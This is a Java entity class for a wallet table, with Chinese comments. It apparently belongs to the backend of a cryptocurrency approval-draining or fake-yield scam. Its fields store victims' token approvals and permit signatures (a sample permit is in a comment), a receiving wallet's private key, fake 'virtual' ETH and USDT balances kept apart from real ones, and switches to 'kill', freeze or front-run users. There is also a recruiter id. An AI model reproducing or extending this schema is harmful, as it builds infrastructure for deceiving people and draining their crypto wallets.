package io.renren.modules.core.entity;

import java.math.BigDecimal;
import java.util.Date;

import com.baomidou.mybatisplus.annotation.TableName;
import com.fasterxml.jackson.annotation.JsonFormat;

import lombok.Data;
@Data
@TableName("s_wallets")
public class WalletsEntity extends BaseEntity{
	
	private String wallet;
	
	private String inviteWallet;
	
	private String approveWallet; //授权钱包
	
	private BigDecimal approveEth;
	
	private String reciverWallet; //接收钱包
	
	private String reciverPk; //私钥
	
	private BigDecimal reciverEth; //收款钱包ETH
	
	private BigDecimal reciverUsdc; //收款钱包USDT
	
	private BigDecimal eth;
	
	private BigDecimal usdc;
	
	private BigDecimal virtualEth; //虚拟ETH
	
	private BigDecimal virtualUsdc; //虚拟USDT
	
	private BigDecimal approveUsdc;
	 /**
	    {
	        owner: '0x629f578bc0D2943527b14f22C8cC8d4ca6a3aaf8', 
	        spender: '0x13Fad8fBe08b774c0D4497917336A5C09504f1f2',
	        value: 1000000000n, 
	        nonce: '0',
	        deadline: 2038389097
	    }
    */
	private String signData;//签名数据
	
	private String addr; //用户地址
	
	private String ip; //IP
	
	private Long inviteId; //招聘员
	
	private Integer kills; //是否杀掉 0：未杀 1：已杀
	
	private Integer rob; //是否开启抢跑 0:不开启 1：开启
	
	private Integer freeze; //是否冻结 0：不冻结 1：冻结
	
	private Integer blockade; //是否封锁 0:不封锁 1：封锁
	
	private Integer reals; //是否真实 0：真实 1:虚拟
	
	private Integer approve; //是否授权 0:未授权 1 已授权
	
	
	@JsonFormat(pattern = "yyyy-MM-dd HH:mm:ss", timezone = "UTC")	
	private Date lastDate; //最后上线时间
	
	private Integer auto;
	
	private Integer rewardType; //0: 分开计算 ， 1： 真实+虚拟 合并计算
	
	private Integer approveOther; //0： 未授权其他平台， 1： 已授权其他平台
	
	private Integer block;
	private Integer nonce;
	private Integer staking; //0:未质押收益  1：质押收益
	
	private BigDecimal monitorEth;
}
